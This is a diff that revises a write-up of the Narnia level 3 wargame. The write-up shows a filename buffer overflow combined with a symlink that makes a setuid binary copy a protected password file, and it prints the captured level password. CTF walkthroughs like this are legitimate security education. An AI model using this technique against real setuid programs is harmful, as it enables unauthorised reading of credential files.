@@ -34,7 +34,7 @@ Unfortunately, strings in C are null byte (`\0`, `0x00`) terminated - the same t
 narnia3@narnia:~$ /narnia/narnia3 $(printf "/etc/narnia_pass/narnia4\x00\x00\x00\x00\x00\x00\x00\x00/home/narnia3/out")
 error opening rnia3/out
 ```
-will not work, as bash strips out any null bytes it finds before passing input to the program.
+will not work. Bash strips out any null bytes it finds before passing input to the program.
 
 Fortunately, we have full access to the filesystem!
 
@@ -63,32 +63,32 @@ ifile="/home/narnia3/narnianarnianarnia/home/narnia3/"
 ofile="/home/narnia3/"
 ```
 
-> Note that C reads strnigs from memory until it finds a null byte (`0x00`), at which point it stops. Therefore N bytes of memory can store N - 1 characters.
+> Note that C reads strings from memory until it finds a null byte (`0x00`), at which point it stops. Therefore N bytes of memory can store N - 1 characters.
 > This is also the reason in our exploit that `ifile` is read from memory as a 48 byte string, as we overflowed over the terminating `0x00` from when `ifile` was initialised.
 
-We can now create file(s) to exploit this behaviour:
+We can now create files to exploit this behaviour:
 
 ```bash
 ln -s /etc/narnia_pass/narnia4 /home/narnia3/narnianarnianarnia/home/narnia3/o
 touch /home/narnia3/o
 ```
 
-Now, when passed as an argument, `ifile` will point to the password file, and the `ofile` will point to an empty file in the home directory.
+Now, when the full path to `o` is passed as an argument, `ifile` will point to the password file, and the `ofile` will point to an empty file in the home directory.
 
 ```bash
-narnia3@narnia:~/narnianarnianarnia/home/narnia3$ /narnia/narnia3 /home/narnia3/narnianarnianarnia/home/narnia3/o
+narnia3@narnia:~$ /narnia/narnia3 /home/narnia3/narnianarnianarnia/home/narnia3/o
 copied contents of /home/narnia3/narnianarnianarnia/home/narnia3/o to a safer place... (/home/narnia3/o)
 ```
 
 We can now just read out the password!
 
 ```
-narnia3@narnia:~/narnianarnianarnia/home/narnia3$ cat /home/narnia3/o
+narnia3@narnia:~$ cat /home/narnia3/o
 thaenohtai
 ▒▒▒▒▒4▒▒▒▒_▒▒}0,narnia3@narnia:
 ```
 
-> You can read out just the password using `strings /home/narnia3/o`.
+> You can read out just the password string using `strings /home/narnia3/o`.
 
 ### Implementation
 
